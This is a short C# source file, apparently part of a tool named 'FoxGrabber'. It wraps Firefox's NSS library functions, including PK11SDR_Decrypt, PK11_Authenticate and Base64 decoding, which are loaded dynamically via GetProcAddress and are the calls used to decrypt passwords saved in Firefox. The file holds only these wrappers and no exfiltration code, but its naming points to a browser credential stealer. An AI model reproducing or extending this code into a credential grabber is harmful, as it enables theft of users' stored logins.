namespace FoxGrabber
{
    using System;
    using System.Runtime.InteropServices;
    using System.Text;
    using static FoxGrabber.Delegates;
    using static FoxGrabber.Structures;

    public class NSS
    {
        public static IntPtr _nssModule { get; set; }

        public NSS() { }

        public static int NSSBase64_DecodeBuffer(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen) => 
        ((NSSBase64_DecodeBufferPtr)Marshal.GetDelegateForFunctionPointer
        (
           NativeMethods.GetProcAddress(_nssModule, nameof(NSSBase64_DecodeBuffer)), typeof(NSSBase64_DecodeBufferPtr))
        )(arenaOpt, outItemOpt, inStr, inLen);

        internal static int PK11SDR_Decrypt(ref TSECItem data, ref TSECItem result, int cx) => ((PK11SDR_DecryptPtr)Marshal.GetDelegateForFunctionPointer
        (
           NativeMethods.GetProcAddress(_nssModule, nameof(PK11SDR_Decrypt)), typeof(PK11SDR_DecryptPtr))
        ) (ref data, ref result, cx);

        public static long PK11_GetInternalKeySlot() => ((PK11_GetInternalKeySlotPtr)Marshal.GetDelegateForFunctionPointer(NativeMethods.GetProcAddress(_nssModule, nameof(PK11_GetInternalKeySlot)), typeof(PK11_GetInternalKeySlotPtr)))();

        public static void PK11_Authenticate(long slot, bool loadCerts, long wincx)
        {
            long num = ((PK11_AuthenticatePtr)Marshal.GetDelegateForFunctionPointer(NativeMethods.GetProcAddress(_nssModule, nameof(PK11_Authenticate)), typeof(PK11_AuthenticatePtr)))(slot, loadCerts, wincx);
        }
    }
}